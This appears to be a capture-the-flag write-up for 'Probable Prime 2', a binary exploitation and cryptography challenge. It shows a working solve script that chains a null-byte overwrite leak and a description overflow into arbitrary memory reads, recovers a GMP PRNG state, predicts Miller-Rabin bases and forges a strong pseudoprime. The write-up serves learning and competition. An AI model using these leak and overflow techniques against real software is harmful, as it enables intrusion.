---
layout: default
title: "Probable Prime 2 (WackAttack CTF 2025)"
date: 2025-10-05 14:00:00 -0000
categories: writeups
tags: [Miller-Rabin, PRNG, Pwn]
---


##### Challenge overview

In this CTF challenge, we are given a Linux binary that acts as a simple database for prime numbers. The binary presents a menu with four options:

```
Welcome to the wack prime database
Sadly we just lost all our primes, so we need help adding some new primes
What do you want to do?
1 Add a prime
2 Edit a primename or description
3 Showcase a prime
4 Factor a prime
> 
```

The flag is revealed after successfully factoring one of the numbers stored in the database. The program checks if submitted numbers are prime, and the factoring function explicitly rejects trivial factors (1 and -1), making it impossible to factor a true prime. This immediately suggests that we must find a way to add a composite number that the binary's primality test accepts as prime. This requires finding and exploiting flaws in both the binary's memory safety and its cryptographic implementation.

##### Reverse engineering

The binary begins by calling the `init()` function:

```c
int init(EVP_PKEY_CTX *ctx){
  [...]
  __gmpz_init_set_str(local_c8,"6364136223846793005",10);
  __gmp_randinit_lc_2exp(st,local_c8,1,0x400);
  __gmpz_init(k);
  [...]
}
```

The function initializes an LCG using GMP's `__gmp_randinit_lc_2exp` with parameters $A = 6364136223846793005, C = 1$ and a modulus of $2^{1024}-1$, which is stored in the global variable `st`. Afterwards, a 25-bit random integer $k$ is generated, as well as the 1024-bit state $X$

```c
int init(EVP_PKEY_CTX *ctx){
  [...]
      __gmpz_init(X);
      for (i = 0; i < 0x11; i = i + 1) {
        __gmpz_urandomb(X,st,0x40);
      }
      __gmpz_urandomb(k,st,0x19);
  [...]
}
```

The function `prime_checker()` implements a Miller-Rabin primality checker with 6 rounds. The random bases are generated using the `__gmpz_urandomm()` function. This means it generates a random number using the global RNG state `st` and the global integer `k` as an upper bound.

```c
undefined8 prime_checker(long param_1){
	[...]
	__gmpz_urandomm(base,st,k);
	[...]
}
```

Miller-Rabin primality checks are not completely reliable, as there exists `Strong Pseudoprimes` which are composite numbers that pass the Miller-Rabin primality test with respect to some bases. To get the flag, we could generate one such pseudoprime to bypass the `prime_checker()` function, and then factor it with our known factors. However, we must be able to predict the binary's generated bases. To predict the generated bases, we must retrieve the values of $k$ and $X$ from the binary and copy the PRNG. 

##### Leaking the state

When a new prime is added, the program reads the description using `fgets`, finds its length with `strlen`, and then manually appends a newline character. This logic is flawed:

```c
void main(EVP_PKEY_CTX *param_1){
	[...]
	__gmpz_set(auStack_978 + local_b20 * 0x50,local_b18);
	printf("Description: ");
	pcVar2 = fgets(acStack_968 + local_b20 * 0x50,58,stdin);
	[...]
		sVar3 = strlen(acStack_968 + local_b20 * 0x50);
		acStack_968[sVar3 + local_b20 * 0x50] = '\n';
		local_b20 = (local_b20 + 1) % 0x1e;
	[...]
}
```

Here, `fgets` reads up to 58 bytes (57 character and a null-terminator). We can trigger the bug by providing a description that is exactly 57 characters long, with no trailing newline:
- `fgets` reads our 57 characters and, seeing no newline, appends a null-terminator `\x00` at index 57.
- `strlen` is called on the buffer, and returns 57.
- The program runs `description_buffer[57] = '\n'` which overwrites the null-terminator with a newline character.
By using the "showcase prime" option in the menu on the corrupted entry, the program will call `printf("%s",...)` and continue to print data until it eventually finds a null-byte.

The data located on the stack after the description buffer happens to be the array that stores pointers to the prime names. We can create a second prime entry without providing a name, so the program assigns it a default name by storing a pointer to a global variable `default_name`. This global `default_name` variable resides in the `.bss` section of the binary.

```python
create_prime(b"leak", b"13", b"A"*57)
create_prime(None, b"11", b"asdf")
prime, desc = showcase_prime(b"0", b"2")
leak = desc.replace(b"A", b"").replace(b"Description: ", b"").strip()
bss_leak = hex(u64(leak.ljust(8, b"\x00")))
```

We can then leak the base address of the PIE executable:

```python
elf.address = int(bss_leak, 16) - 0x6150
print(f"PIE = {hex(elf.address)}")
```

With the base address, we can create an arbitrary write primitive. The prime entries consist of a name, a prime number, and an optional description:

```c
struct prime_ent
{
  char *m_pName;
  __int64 _0x0004;
  char prime[16];
  char description[48];
};
```

The description is stored in a 48 byte buffer. However, when editing the description of an existing prime, 58 bytes are read into the buffer:

```c
void main(EVP_PKEY_CTX *param_1){
	[...]
    printf("Description: ");
    pcVar2 = fgets(acStack_968 + CONCAT44(uStack_b24,local_b28) * 0x50, 58, stdin);
	[...]
}
```

We can use this overflow to overwrite the name of an adjacent prime entry in the database. This gives us an arbitrary read, as we can send a payload of `b"A"*48 + p64(target_address)` to entry 0's description, which overwrites entry 1's name to `p64(target_address)`. When showcasing this entry later, the program calls `printf("%s", m_pName)`. Since `m_pName` now holds the target address we supplied, `printf` begins reading bytes from that location in memory and sends them back to us.

```python
def leak_add(address):
    edit_description(b"0", b"A"*48 + p64(address))
    name_leak, _ = showcase_prime(b"1", b"3")
    leaked_prefix = name_leak.split(b":")[0]
    data = leaked_prefix[1:9].ljust(8, b"\0")
    return u64(data)
```

We use this arbitrary read to leak the values of $k$ and $X$, which are contained within the object `st`. `st` is structured as follows:

```
pwndbg> x/8gx &st
0x55f038d5d180 <st>:    0x0000000000000000      0x000055f0393152c0 <- algdata pointer
0x55f038d5d190 <st+16>: 0x0000000000000000      0x00007fa5f5e6bbe0
0x55f038d5d1a0 <k>:     0x0000000100000001      0x000055f039315440 <- k pointer
```

```
pwndbg> x/32gx 0x000055f0393152c0
0x55f0393152c0: 0x0000001000000010      0x000055f039315300 # <- X pointer
0x55f0393152d0: 0x0000000100000001      0x000055f039315390
0x55f0393152e0: 0x0000000000000001      0x0000000000000001
0x55f0393152f0: 0x0000000000000400      0x0000000000000091 # <- 0x400 = 1024 bit-size
0x55f039315300: 0xecac3f17450b1e56      0xcfd2a64548f2e35c # <- X is here
0x55f039315310: 0x9ca3c08925695bcf      0xa7a71d64ebf073cb
0x55f039315320: 0x88e98595174a6964      0x07a3f69c34ec83bc
0x55f039315330: 0x416760bd066590af      0x4d5b571b50e6a95b
0x55f039315340: 0xcdd12d48238d3608      0x8f9914b302e0967a
0x55f039315350: 0xfb0302810f366862      0xfbb371fcae55b7b7
0x55f039315360: 0x140c017107775d37      0x7d86f2f23316cc7f
0x55f039315370: 0x17e984772c9c5dbd      0x50b9e2235dc0df41
```

So, we can retrieve the values of $k$ and $X$ from the binary:

```python
k_addr = leak_add(elf.sym.k+8)
k = leak_add(k_addr)
print(f"k = {hex(k)}")

algdata_ptr = leak_add(elf.sym.st+0x8)
print(f"algdata_ptr  = {hex(algdata_ptr)}")

x_ptr = algdata_ptr + 64
print(f"x_ptr  = {hex(x_ptr)}")

chunks = []
for i in range(16):
    chunks.append(p64(leak_add(x_ptr + i*8)))

Xbytes = b"".join(chunks)
assert b"\x00" not in Xbytes
X = int.from_bytes(Xbytes, 'little')
print(f"Leaked 1024-bit state X = {hex(X)}")
```

Since our leak relies on overwriting `\x00` with `\n`, any address or value we leak cannot contain `\x00`. Therefore, we must rerun the attack until the leaked values do not contain a null-byte.

```
PIE = 0x55f038d57000
k = 0x46ed81
algdata_ptr  = 0x55f0393152c0
x_ptr  = 0x55f039315300
Leaked 1024-bit state X = 0x50b9e2235dc0df4117e984772c9c5dbd7d86f2f23316cc7f140c017107775d37fbb371fcae55b7b7fb0302810f3668628f9914b302e0967acdd12d48238d36084d5b571b50e6a95b416760bd066590af07a3f69c34ec83bc88e98595174a6964a7a71d64ebf073cb9ca3c08925695bcfcfd2a64548f2e35cecac3f17450b1e56
```

##### Predicting the bases

With $k$ and $X$ leaked from the binary, we can recreate the PRNG locally to generate the 6 bases used in the Miller-Rabin primality check. We can recreate the `__gmp_randinit_lc_2exp` LCG locally, and, with some reverse-engineering and lucky prompts, recreate GMP's `__gmpz_urandomm()` function:

```python
A = 0x5851f42d4c957f2d
C = 1
MASK1024  = 2^1024 - 1
HALF_BITS = 512
HALF_MASK = 2^HALF_BITS - 1

class LCG1024:
    def __init__(self, X):
        self.X = X & MASK1024

    def step(self):
        self.X = (A * self.X + C) & MASK1024

    def high512(self):
        self.step()
        return (self.X >> HALF_BITS) & HALF_MASK

def _gmp_rand_bits(nbits, rng):
    chunk = rng.high512()
    if nbits <= HALF_BITS:
        return chunk & ((1 << nbits) - 1)
    out = 0
    got = 0
    while got < nbits:
        take = min(HALF_BITS, nbits - got)
        out |= (chunk & ((1 << take) - 1)) << got
        got += take
        if got < nbits:
            chunk = rng.high512()
    return out

def urandomm_mod(n, rng):
    size = (n.bit_length() + 63) // 64
    nh = (n >> (64*(size-1))) & ((1<<64)-1)
    clz = (64 - nh.bit_length()) if nh != 0 else 64
    pow2 = 1 if (nh & (nh-1) == 0 and (size == 1 or (n & ((1 << (64*(size-1))) - 1)) == 0)) else 0
    nbits = size*64 - clz - pow2
    if nbits == 0:
        return 0
    while True:
        r = _gmp_rand_bits(nbits, rng)
        if r < n:
            return r
```

We then  predict the 6 bases with $k$ and $X$:

```python
def predict_bases(k, X, rounds=6):
    rng = LCG1024(X)
    return [urandomm_mod(k, rng) + 2 for _ in range(rounds)]
    
bases = predict_bases(k, X, rounds=6)
```

##### Generating the Miller-Rabin pseudoprime

With the bases, we can use the Prime-and-Prejudice attack against Miller-Rabin with some bases. Implementations exist online, for example from https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py in SageMath.

```python
N, p1, p2, p3 = generate_pseudoprime(bases)
print(f"Found pseudoprime N = {N}")
print(f"Factor 1 (p1) = {p1}")
print(f"Factor 2 (p2*p3) = {p2 * p3}")
```

After some waiting, the function returns a pseudoprime $N$ and factors $p_{1},p_{2},p_{3}$. By creating the prime and factoring it, we get our flag:

```python
io.sendlineafter(b"> ",b"1")
io.sendlineafter(b"> ",b"0")
io.sendlineafter(b"Your prime: ",str(N).encode())
io.sendlineafter(b"Description: ",b":iku:")

io.sendlineafter(b"> ",b"4")
io.sendlineafter(b"> ",b"2")
io.sendlineafter(b"Factor 1: ",str(p1).encode())
io.sendlineafter(b"Factor 2: ",str(p2*p3).encode())
io.recvline()
print(io.recvline().decode().strip())
io.interactive()
# wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
```

##### Solve.sage

```python
from pwn import *

# ======================== PWN ========================

elf = ELF("./probableprime2electricboogaloo")
#io = process("./probableprime2electricboogaloo")
io = remote("ctf.wackattack.eu", 8090)

def create_prime(name, prime, desc):
    io.recvuntil(b">")
    io.sendline(b"1")
    io.recvuntil(b">")
    if name:
        io.sendline(b"1")
        io.recvuntil(b"Name: ")
        io.sendline(name)
    else:
        io.sendline(b"0")
    io.recvuntil(b"prime: ")
    io.sendline(prime)
    io.recvuntil(b"Description: ")
    io.sendline(desc)

def showcase_prime(idx, opt):
    io.recvuntil(b">")
    io.sendline(b"3")
    io.recvuntil(b"> ")
    io.sendline(idx)
    io.recvuntil(b">")
    io.sendline(opt)
    leak1 = io.recvline()
    leak2 = io.recvline()
    return leak1, leak2

def edit_description(idx, data):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"> ")
    io.sendline(idx)
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.sendlineafter(b"Description: ", data)

def leak_add(address):
    edit_description(b"0", b"A"*48 + p64(address))
    name_leak, _ = showcase_prime(b"1", b"3")
    leaked_prefix = name_leak.split(b":")[0]
    data = leaked_prefix[1:9].ljust(8, b"\0")
    return u64(data)

create_prime(b"leak", b"13", b"A"*57)
create_prime(None, b"11", b"asdf")
prime, desc = showcase_prime(b"0", b"2")
leak = desc.replace(b"A", b"").replace(b"Description: ", b"").strip()
bss_leak = hex(u64(leak.ljust(8, b"\x00")))
elf.address = int(bss_leak, 16) - 0x6150
print(f"PIE = {hex(elf.address)}")

k_addr = leak_add(elf.sym.k+8)
k = leak_add(k_addr)
print(f"k = {hex(k)}")

algdata_ptr = leak_add(elf.sym.st+0x8)
print(f"algdata_ptr  = {hex(algdata_ptr)}")

x_ptr = algdata_ptr + 64
print(f"x_ptr  = {hex(x_ptr)}")

chunks = []
for i in range(16):
    chunks.append(p64(leak_add(x_ptr + i*8)))

Xbytes = b"".join(chunks)
print(Xbytes)
assert b"\x00" not in Xbytes
X = int.from_bytes(Xbytes, 'little')
print(f"Leaked 1024-bit state X = {hex(X)}")

# ======================== CRYPTO ========================

A = 0x5851f42d4c957f2d
C = 1
MASK1024  = 2^1024 - 1
HALF_BITS = 512
HALF_MASK = 2^HALF_BITS - 1

class LCG1024:
    def __init__(self, X):
        self.X = X & MASK1024

    def step(self):
        self.X = (A * self.X + C) & MASK1024

    def high512(self):
        self.step()
        return (self.X >> HALF_BITS) & HALF_MASK

def _gmp_rand_bits(nbits, rng):
    chunk = rng.high512()
    if nbits <= HALF_BITS:
        return chunk & ((1 << nbits) - 1)
    out = 0
    got = 0
    while got < nbits:
        take = min(HALF_BITS, nbits - got)
        out |= (chunk & ((1 << take) - 1)) << got
        got += take
        if got < nbits:
            chunk = rng.high512()
    return out

def urandomm_mod(n, rng):
    size = (n.bit_length() + 63) // 64
    nh = (n >> (64*(size-1))) & ((1<<64)-1)
    clz = (64 - nh.bit_length()) if nh != 0 else 64
    pow2 = 1 if (nh & (nh-1) == 0 and (size == 1 or (n & ((1 << (64*(size-1))) - 1)) == 0)) else 0
    nbits = size*64 - clz - pow2
    if nbits == 0:
        return 0
    while True:
        r = _gmp_rand_bits(nbits, rng)
        if r < n:
            return r

def predict_bases(k, X, rounds=6):
    rng = LCG1024(X)
    return [urandomm_mod(k, rng) + 2 for _ in range(rounds)]

# https://github.com/jvdsn/crypto-attacks/blob/master/shared/crt.py
def fast_crt(X, M, segment_size=8):
    from math import lcm
    """
    Uses a divide-and-conquer algorithm to compute the CRT remainder and least common multiple.
    :param X: the remainders
    :param M: the moduli (not necessarily coprime)
    :param segment_size: the minimum size of the segments (default: 8)
    :return: a tuple containing the remainder and the least common multiple
    """
    assert len(X) == len(M)
    assert len(X) > 0
    while len(X) > 1:
        X_ = []
        M_ = []
        for i in range(0, len(X), segment_size):
            if i == len(X) - 1:
                X_.append(X[i])
                M_.append(M[i])
            else:
                X_.append(crt(X[i:i + segment_size], M[i:i + segment_size]))
                M_.append(lcm(*M[i:i + segment_size]))
        X = X_
        M = M_

    return X[0], M[0]

# https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py
# =========================================================================================
def _generate_s(A, k):
    S = []
    for a in A:
        # Possible non-residues mod 4a of potential primes p
        Sa = set()
        for p in range(1, 4 * a, 2):
            if kronecker(a, p) == -1:
                Sa.add(p)

        # Subsets of Sa that meet the intersection requirement
        Sk = []
        for ki in k:
            assert gcd(ki, 4 * a) == 1
            Sk.append({pow(ki, -1, 4 * a) * (s + ki - 1) % (4 * a) for s in Sa})

        S.append(Sa.intersection(*Sk))

    return S

def _backtrack(S, A, X, M, i):
    if i == len(S):
        return fast_crt(X, M)

    M.append(4 * A[i])
    for za in S[i]:
        X.append(za)
        try:
            fast_crt(X, M)
            z, m = _backtrack(S, A, X, M, i + 1)
            if z is not None and m is not None:
                return z, m
        except ValueError:
            pass
        X.pop()

    M.pop()
    return None, None

def generate_pseudoprime(A, k2=None, k3=None, min_bit_length=0):
    """
    Generates a pseudoprime of the form p1 * p2 * p3 which passes the Miller-Rabin primality test for the provided bases.
    More information: R. Albrecht M. et al., "Prime and Prejudice: Primality Testing Under Adversarial Conditions"
    :param A: the bases
    :param k2: the k2 value (default: next_prime(A[-1]))
    :param k3: the k3 value (default: next_prime(k2))
    :param min_bit_length: the minimum bit length of the generated pseudoprime (default: 0)
    :return: a tuple containing the pseudoprime n, as well as its 3 prime factors
    """
    A.sort()
    if k2 is None:
        k2 = int(next_prime(A[-1]))
    if k3 is None:
        k3 = int(next_prime(k2))
    while True:
        print(f"Trying {k2 = } and {k3 = }...")
        X = [pow(-k3, -1, k2), pow(-k2, -1, k3)]
        M = [k2, k3]
        S = _generate_s(A, M)
        print(f"{S = }")
        z, m = _backtrack(S, A, X, M, 0)
        if z and m:
            print(f"Found residue {z} and modulus {m}")
            i = (2 ** (min_bit_length // 3)) // m
            while True:
                p1 = int(z + i * m)
                p2 = k2 * (p1 - 1) + 1
                p3 = k3 * (p1 - 1) + 1
                if is_prime(p1) and is_prime(p2) and is_prime(p3):
                    return p1 * p2 * p3, p1, p2, p3

                i += 1
        else:
            k3 = int(next_prime(k3))
# =========================================================================================

bases = predict_bases(k, X, rounds=6)
N, p1, p2, p3 = generate_pseudoprime(bases)

print(f"Found pseudoprime N = {N}")
print(f"Factor 1 (p1) = {p1}")
print(f"Factor 2 (p2*p3) = {p2 * p3}")

io.sendlineafter(b"> ",b"1")
io.sendlineafter(b"> ",b"0")
io.sendlineafter(b"Your prime: ",str(N).encode())
io.sendlineafter(b"Description: ",b":iku:")

io.sendlineafter(b"> ",b"4")
io.sendlineafter(b"> ",b"2")
io.sendlineafter(b"Factor 1: ",str(p1).encode())
io.sendlineafter(b"Factor 2: ",str(p2*p3).encode())
io.recvline()
print(io.recvline().decode().strip())
io.interactive()
# wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
```

